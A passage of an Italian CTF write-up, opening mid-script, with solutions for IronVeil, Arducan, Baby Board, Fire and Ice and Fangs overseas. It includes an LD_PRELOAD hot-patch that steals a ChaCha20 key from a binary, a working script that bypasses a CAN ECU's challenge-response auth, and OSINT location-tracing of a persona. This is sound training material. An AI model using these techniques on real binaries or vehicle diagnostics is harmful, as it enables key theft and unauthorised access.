      raise ValueError("invalid padding")
   if block[-pad_len:] != bytes([pad_len]) * pad_len:
      raise ValueError("padding bytes mismatch")
   return block[:-pad_len]


def main() -> None:
   parser = argparse.ArgumentParser(description=__doc__)
   parser.add_argument(
      "--key",
      default=Path("extracted/e/f1"),
      type=Path,
      help="path to e/f1 (la chiave AES grezza da 32 byte)",
   )
   parser.add_argument(
      "--blob",
      default=Path("extracted/e/f2"),
      type=Path,
      help="path to e/f2 (blob base64 IV+ciphertext)",
   )
   parser.add_argument(
      "--out",
      default=Path("uwu/flag.txt"),
      type=Path,
      help="percorso di output per la flag recuperata (default: uwu/flag.txt)",
   )
   args = parser.parse_args()

   key = read(args.key)
   blob = base64.b64decode(read(args.blob))
   iv, ciphertext = blob[:16], blob[16:]
   aes = AES.new(key, AES.MODE_CBC, iv)
   plaintext = unpad(aes.decrypt(ciphertext))

   args.out.parent.mkdir(parents=True, exist_ok=True)
   args.out.write_bytes(plaintext)
   print(plaintext.decode())
   print(f"Flag scritta in {args.out}")


if __name__ == "__main__":
   main()
```

### IronVeil

#### Analisi

Abbiamo ricevuto un binario ELF64 “stripped” (`ironveil`) e un blob cifrato (`flag.txt.encrypted`). Eseguire il binario cifra un file nominato ed emette un contenitore `IRONVEIL_ENC_V3`:

* `00..0f`: `"IRONVEIL_ENC_V3\0"`
* `10..1b`: nonce da 12 byte
* `1c..end-10`: ciphertext
* `ultimi 16`: tag Poly1305
  (Lunghezza plaintext = dimensione totale − 44 byte.)

La ricognizione statica (main a `0xfb60`) mostrava hardening pesante: controlli poll/stack, una VM per thread, e `ChaCha20-Poly1305`. Stringhe vicino a `0x59c8a` ("Key derived using VM program with 101 opcodes") indicano che la chiave è calcolata al volo. La pipeline è guidata da `sub_9F20`, che alimenta un core AVX ChaCha (`sub_1B4A0`) usando la costante `"expand 32-byte k"` a `0x572c0`.

Idee ingenue fallite:

* Hash dell’mtime del file (`Fri, 07 Nov 2025 23:35:40 GMT`) non riproduce la chiave; la VM mescola stato extra nascosto.
* Hook `LD_PRELOAD` su memcpy/sniffer dumpano molta memoria ma il programma azzera i buffer prima di stampare.
* Snapshot catturano solo zeri perché la chiave vive per lo più nei registri.

Osservazione chiave: subito prima di chiamare il blocco ChaCha, `sub_9F20` riversa brevemente la chiave da 32 byte sullo stack a `[rsp+0xa0]`. Quella finestra basta per rubarla.

#### Soluzione

Abbiamo usato un helper `LD_PRELOAD` per patchare a caldo il binario e intercettare quello spill:

1. Individuare la base PIE via `/proc/self/maps`.
2. Sovrascrivere l’istruzione a `PIE+0xd758` con `movabs rax,<hook>; call rax`, rimpiazzando temporaneamente l’originale `movl $0,0xc0(%rsp)`.
3. In una stub “naked”, copiare 32 byte da `[rsp+0xa0]` in un buffer globale, rigiocare l’istruzione spostata e `ret`.
4. Un hook leggero su `write()` stampa la chiave quando vede la riga "Key derived using ...".

Eseguendo una cifratura qualunque con il preloader si ottiene:

```
[keyhook] base=0x559fe85f3000
[keyhook] derived key 7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95
File encrypted successfully: sample.txt.encrypted
Key derived using VM program with 101 opcodes
```

Con la chiave ChaCha a 32 byte in mano, la decrittazione è diretta: parsare il formato, estrarre nonce/ciphertext/tag e usare `ChaCha20-Poly1305` con AAD vuoto.

#### Script

Compila ed esegui il preloader per esfiltrare la chiave:

```bash
cd ironveil_lab
gcc -shared -fPIC keyhook.c -o keyhook.so -ldl
LD_PRELOAD=$PWD/keyhook.so ./ironveil sample.txt
```

Decritta `flag.txt.encrypted` offline:

```python
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

key = bytes.fromhex("7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95")
blob = Path("flag.txt.encrypted").read_bytes()
nonce, ct, tag = blob[16:28], blob[28:-16], blob[-16:]
flag = ChaCha20Poly1305(key).decrypt(nonce, ct + tag, b"")
print(flag.decode())
```

## Hardware 🔌

### Arducan

#### Analisi

Il firmware `sketch.elf` espone una ECU CAN testuale accessibile via TCP: accetta frame formattati come
`CAN_ID:LEN:BYTE0,BYTE1,...` ed implementa una piccola macchina a stati gated da un’autenticazione. Il flusso
ad alto livello è: handshake diagnostico, richiesta di una challenge a 32 bit, calcolo e invio di una risposta
deterministica, invio di due comandi di stato identici per avanzare un latch interno, poi lettura della flag
in memoria a chunk.

ID e comportamenti chiave: 0x7E0 (handshake diagnostico), 0x600 (autenticazione), 0x700 (comandi di stato) e 0x7FF
(letture flag). Su richiesta di challenge (opcode interno 0x7C) il firmware ritorna 4 byte di challenge e un
contatore di sequenza (`seq`). La risposta richiesta è:

`resp = ((challenge ^ 0xDEADBEEF) * 0x1337 + seq) & 0xffffffff`

Inviala su CAN 0x600 con byte iniziale 0xC3 seguito dalla risposta a 4 byte big-endian. Dopo auth valida,
due frame `0x700:4:69,13,37,42` identici avanzano il latch. La flag si legge inviando frame `0x7FF` con
opcode `0xF1` e un offset; le risposte contengono fino a 6 byte ASCII per richiesta.

#### Soluzione

Procedura compatta per recuperare la flag: connettersi via TCP e svuotare il banner; inviare `0x7E0:2:A5,A5`
per l’handshake; richiedere la challenge con `0x600:2:3C,00`, parsare i 4 byte di challenge e il `seq` dalla
risposta, calcolare `resp` come sopra e inviarlo come `0x600:5:C3,RR,RR,RR,RR` (big-endian). Una volta confermato,
inviare `0x700:4:69,13,37,42` due volte (identici, consecutivi) per sbloccare le letture. Infine, iterare letture
`0x7FF:2:F1,offset` con offset += 6 e concatenare i chunk da 6 byte finché l’ultimo è più corto.

One-liner essenziale: CONNECT --> `0x7E0:2:A5,A5` --> `0x600:2:3C,00` --> parse(chal,seq) --> `0x600:5:C3,resp_be` -->
`0x700` x2 --> ripetute `0x7FF:2:F1,offset`.

#### Script

```python
import re
import socket
from typing import List, Tuple


HOST = "303ed4c6.ctf.ac.upt.ro"
PORT = 9730

FRAME_RE = re.compile(r"^([0-9A-Fa-f]+):(\d+):(.*)$")


def recv_line(sock_file) -> str:
    line = sock_file.readline()
    if not line:
        raise ConnectionError("Connection closed by remote host")
    text = line.rstrip("\r\n")
    print(f"<< {text}")
    return text


def wait_for_frame(sock_file) -> Tuple[int, int, List[int]]:
    while True:
        line = recv_line(sock_file)
        m = FRAME_RE.match(line)
        if not m:
            continue
        can_id = int(m.group(1), 16)
        length = int(m.group(2), 10)
        data_str = m.group(3).strip()
        data: List[int] = []
        if data_str:
            data = [int(part, 16) for part in data_str.split(",") if part]
        return can_id, length, data


def send_frame(sock, sock_file, can_id: int, data: List[int]) -> Tuple[int, int, List[int]]:
    frame = f"{can_id:03X}:{len(data)}"
    if data:
        frame += ":" + ",".join(f"{b:02X}" for b in data)
    print(f">> {frame}")
    sock.sendall(frame.encode() + b"\n")
    return wait_for_frame(sock_file)


def compute_auth_response(challenge: int, seq: int) -> int:
    tmp = challenge ^ 0xDEADBEEF
    result = (tmp * 0x1337) & 0xFFFFFFFF
    result = (result + (seq & 0xFFFF)) & 0xFFFFFFFF
    return result


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        sock_file = sock.makefile("r", encoding="utf-8", newline="\n")

        # Drain the banner
        sock.settimeout(0.5)
        try:
            for _ in range(32):
                sock.settimeout(0.5)
                line = sock_file.readline()
                if not line:
                    break
                text = line.rstrip("\r\n")
                if not text:
                    break
                print(f"<< {text}")
        except (socket.timeout, ConnectionError):
            pass
        finally:
            sock.settimeout(None)

        # Stage 0: ECU diagnostic kick-off
        send_frame(sock, sock_file, 0x7E0, [0xA5, 0xA5])

        # Stage 1: request authentication challenge
        can_id, _, data = send_frame(sock, sock_file, 0x600, [0x3C, 0x00])
        if can_id != 0x608 or len(data) < 6 or data[0] != 0x7C:
            raise RuntimeError("Unexpected authentication challenge response")

        challenge_bytes = data[1:5]
        seq_counter = data[5]
        challenge = (
            (challenge_bytes[3] << 0)
            | (challenge_bytes[2] << 8)
            | (challenge_bytes[1] << 16)
            | (challenge_bytes[0] << 24)
        )
        print(f"[+] Challenge: 0x{challenge:08X}, seq={seq_counter}")

        # Stage 2: send authentication response
        auth_value = compute_auth_response(challenge, seq_counter)
        auth_payload = [0xC3] + list(auth_value.to_bytes(4, "big"))
        can_id, _, data = send_frame(sock, sock_file, 0x600, auth_payload)
        if can_id != 0x608 or not data or data[0] != 0xD3:
            raise RuntimeError("Authentication failed")
        seq_counter = (seq_counter + 1) & 0xFFFF

        # Stage 3: state commands (send twice)
        for _ in range(2):
            can_id, _, data = send_frame(sock, sock_file, 0x700, [0x69, 0x13, 0x37, 0x42])
            if can_id != 0x708 or len(data) < 2 or data[0] != 0x79:
                raise RuntimeError("State command rejected")

        # Stage 4: request flag chunks
        flag_bytes = bytearray()
        offset = 0
        while True:
            can_id, length, data = send_frame(sock, sock_file, 0x7FF, [0xF1, offset])
            if can_id != 0x7F8 or length < 2 or len(data) < 2 or data[0] != 0xF1:
                raise RuntimeError("Flag request rejected")
            chunk = data[2:]
            flag_bytes.extend(chunk)
            if len(chunk) < 6:
                break
            offset += len(chunk)

        flag = bytes(flag_bytes).decode(errors="ignore")
        print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
```

### Baby Board

#### Analisi

Ci è stato dato uno ZIP di **file Gerber di fabbricazione** (`Gerber_PCB1_2025-11-08.zip`), gli output CAM standard per la produzione PCB (rame, solder mask, serigrafia, fori, ecc.). I Gerber sono semplici istruzioni da plotter: move/draw con aperture, un file per layer. Le flag nelle CTF “hardware” sono spesso nascoste nella **serigrafia top** (legenda componenti) o nel rame.

Senza un servizio da testare, era un puro task di ispezione/formato. I luoghi probabili della flag, in ordine:

1. **Top Silkscreen** (`*.GTO`)
2. **Bottom Silkscreen** (`*.GBO`)
3. **Layer di rame** (es. `*.GTL`, `*.GBL`) come testo a spazio negativo
4. **Sagoma scheda** / layer meccanici (`*.GKO`, `*.GML`)
5. Note drill/map

#### Soluzione

Ho aperto l’archivio e ispezionato il file **Top Silkscreen** (`Gerber_TopSilkscreenLayer.GTO`). Si possono vedere i Gerber con una GUI (es. `gerbv`, Gerber Viewer di KiCad o InteractiveHtmlBom), ma ho fatto anche un parser/plotter rapido per sicurezza.

Il file usa costrutti RS-274X comuni:

* **Unità:** mm (`MOMM`)
* **Formato:** ad es. `FSLAX45Y45` -> X/Y hanno 4 cifre intere + 5 decimali
* **Move/Draw:** `D02` = move (penna su), `D01` = draw (penna giù), tipicamente con `G01` per interpolazione lineare

Plottando in ordine i comandi `G01 X... Y... D..*`, compaiono i **tratti vettoriali** del testo serigrafico. Zoomando l’area superiore della scheda, si vede la flag resa come testo outline.

Ho esportato un’anteprima zoomata della serigrafia che mostra la flag:

![Serigrafia zoom con flag](/images/silkscreen.png)

#### Script

Snippet Python minimale per parsare e visualizzare i tratti dal file GTO (serigrafia). Estrae i move lineari `G01`, interpreta `D02`/`D01` (move/draw), scala in mm e plotta:

```python
import re, zipfile
import matplotlib.pyplot as plt

zf = zipfile.ZipFile("/mnt/data/Gerber_PCB1_2025-11-08.zip")
gto = zf.read("Gerber_TopSilkscreenLayer.GTO").decode("utf-8", errors="ignore")

scale = 1e5  # per FSLAX45Y45 (formato 4.5)

cmds = []
for line in gto.splitlines():
    line = line.strip()
    if not line.startswith("G01"):  # solo movimenti lineari
        continue
    m = re.match(r"G01X(-?\d+)Y(-?\d+)D(\d+)\*", line)
    if m:
        x, y, d = int(m.group(1))/scale, int(m.group(2))/scale, int(m.group(3))
        cmds.append((x, y, d))

segments, last = [], None
for x, y, d in cmds:
    if d == 2:          # D02: move (penna su)
        last = (x, y)
    elif d == 1:        # D01: draw (penna giù)
        if last: segments.append((last[0], last[1], x, y))
        last = (x, y)

plt.figure(figsize=(12,4))
for x0,y0,x1,y1 in segments:
    plt.plot([x0,x1],[y0,y1], linewidth=2)
plt.gca().set_aspect('equal', adjustable='box')
plt.gca().invert_yaxis()  # comune nei viewer PCB
plt.title("Top Silkscreen – zoom")
plt.xlabel("mm"); plt.ylabel("mm")
plt.tight_layout(); plt.show()
```

## Forensics 🤖

### Fire and Ice

#### Analisi

La challenge fornisce un unico file, `adofai.zip`, che contiene un `flag.txt` con una flag non valida.
Usando unzip si vede che c’è qualche altro dato concatenato allo zip.

```
warning [adofai.zip]: 453 extra bytes at beginning or within zipfile
```

Byte extra di solito significano che un altro archivio (o dati arbitrari) è concatenato in coda al file. Nel nostro caso era un altro zip che conteneva un altro `flag.txt`.

#### Soluzione

Questi sono i passi seguiti per ottenere la flag:

1. **Ispezione iniziale**

   ```bash
   unzip -l adofai.zip
   ```

   L’output elenca un solo `flag.txt`, ma l’avviso sui “byte extra” è l’indizio chiave.

2. **Confermare i dati in coda**

   ```bash
   7z l adofai.zip
   ```

   7-Zip riporta `Tail Size = 453`, cioè ci sono 453 byte aggiuntivi dopo la struttura ZIP normale. Quei dati sono un altro archivio ZIP.

3. **Carving degli zip**
   I file ZIP terminano con un record End-of-Central-Directory (EOCD) che inizia con la firma `PK\x05\x06`. L’idea è:

   * Trovare l’EOCD nel file.
   * Copiare tutto dall’inizio del file fino all’EOCD in un buffer a parte.
   * Trattare quel buffer come uno ZIP autonomo e leggerne i contenuti.
   * Spostare l’offset in avanti e ripetere finché il file originale è esaurito.

   Il seguente snippet Python automatizza il processo:

   ```python
   import io, re, zipfile
   from pathlib import Path

   data = Path('adofai.zip').read_bytes()
   offset = 0
   flags = []

   while offset < len(data):
       chunk = data[offset:]
       idx = chunk.find(b'PK\x05\x06')  # ignature that sign the end of a zip file
       if idx == -1 or idx + 22 > len(chunk):
           break
       comment_len = int.from_bytes(chunk[idx+20:idx+22], 'little')
       archive_len = idx + 22 + comment_len
       archive_bytes = chunk[:archive_len]

       zf = zipfile.ZipFile(io.BytesIO(archive_bytes))
       for name in zf.namelist():
           contents = zf.read(name).decode('utf-8', errors='ignore')
           for match in re.findall(r'ctf\{[^}]+\}', contents):
               flags.append(match)

       offset += archive_len

   for flag in flags:
       print(flag)
   ```

4. **Risultati**
   Eseguendo lo script stampa tre flag:

   * `ctf{a428cd995d7a8dcd690dbd138f6df56f9df9eaef4610b1747f5fc75c9d432f8f}`
   * `ctf{281dbf950ada8e90f9320071fd871af042fd67d3bdf94043640b9ae673d0c952}`
   * `ctf{6622d9c1a2f093f921c301f19374a568cf243c0b15646e43bcb7585af824dc63}`

   Ogni .zip contiene un singolo `flag.txt`, quindi ci sono esattamente tre layer e tre flag.

## OSINT 🌏

### Fangs overseas

#### Analisi

In questa challenge ci viene presentato Vlad da Debugger, un informatico che ha viaggiato e visitato una chiesa. Il nostro obiettivo è trovare quale chiesa ha visitato.

Cercando sui social, ho trovato un profilo Instagram chiamato `vlad.da.debugger`. Nelle storie, una foto scattata all’`Aeroporto Internazionale Salgado Filho (Porto Alegre, Brasile)`, e nei post un’immagine di un gatto con la seguente descrizione:

`Found this little beast in my trip and took him for a walk for 36.4 km. Too bad that banks and churches aren't pet friendly. 😒`

#### Soluzione

Sapendo che era in quell’aeroporto e ha viaggiato altri 36,4 km, ho cercato chiese entro un raggio di circa `36,4 km` dall’aeroporto e ho trovato la `Catedral Basílica São Luís Gonzaga`, con coordinate -29.68, -51.13.
Secondo il formato della flag CTF{SHA256(lat,lon)}, la flag è:

`CTF{2516ec825f263d3348127605e0091317f0cd94509055affb67ca09cb4304c301}.`

#### Script

```bash
echo -n "-29.68,-51.13" | sha256sum
```
